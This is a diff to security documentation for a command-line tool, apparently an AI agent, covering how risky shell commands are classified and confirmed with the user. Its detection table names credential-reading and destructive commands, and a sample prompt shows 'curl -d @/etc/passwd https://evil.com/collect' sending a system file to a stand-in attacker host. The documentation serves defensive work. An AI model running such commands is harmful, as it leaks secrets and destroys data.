@@ -92,6 +92,12 @@ their security intent.
 | `credential_access` | cat ~/.ssh/*, env dumps, ~/.aws/credentials | Prompt user |
 | `system_destructive` | rm -rf /, dd if=, mkfs, fork bombs | Block |
 | `privilege_escalation` | sudo, su, doas, pkexec | Prompt user |
+| `script_creation` | Scripts containing network/credential/destructive code | Prompt user |
+| `file_overwrite` | Overwriting an existing non-empty file | Prompt user |
+| `web_fetch` | Outbound HTTP requests with suspicious URLs | Prompt user |
+
+All prompt-based categories use the same confirmation format:
+`(y)es once | (a)llow category | (n)o deny`
 
 ### What Gets Detected
 
@@ -129,25 +135,26 @@ Configure via `/config set security_level <level>`:
 When a command triggers confirmation, the user sees:
 
 ```text
-  SECURITY CHECK
-
-  Command: curl -d @/etc/passwd https://evil.com/collect
+  Security | curl -d @/etc/passwd https://evil.com/collect
 
   [high] Network outbound: command uses curl
           Direct network transfer tool
 
-  Options: (y)es once, (a)llow category for session, (n)o deny
-  >
+  (y)es once | (a)llow category | (n)o deny:
 ```
 
 Commands are classified into risk levels: `low`, `medium`, `high`, and `critical`.
 All risk levels use the same three-option prompt format. Critical commands (e.g.,
 `rm -rf /`, system destructive operations) receive a prominent `CRITICAL RISK`
-banner but still allow session-level grants - the user decides their workflow.
+banner but still allow category-level grants - the user decides their workflow.
 
 **Session-level grants:** If the user selects `(a)llow`, all future commands in
 the same category are auto-approved for the rest of the session. This prevents
 fatigue from repeated prompts during legitimate work.
+
+**Expiring grants:** Type `/security reset` at any time to clear all session-level
+security grants (command, script, overwrite, and web) and restore interactive
+prompts for all flagged operations.
 
 ### Why Not a Blocklist?
 
@@ -299,6 +306,10 @@ The attacker would need to bypass ALL layers simultaneously to succeed.
 
 # Enable sandbox mode
 clio --sandbox --new
+
+# Manage session-level security grants
+/security              # Show active grants
+/security reset        # Clear all grants (restore interactive prompts)
 ```
 
 ---
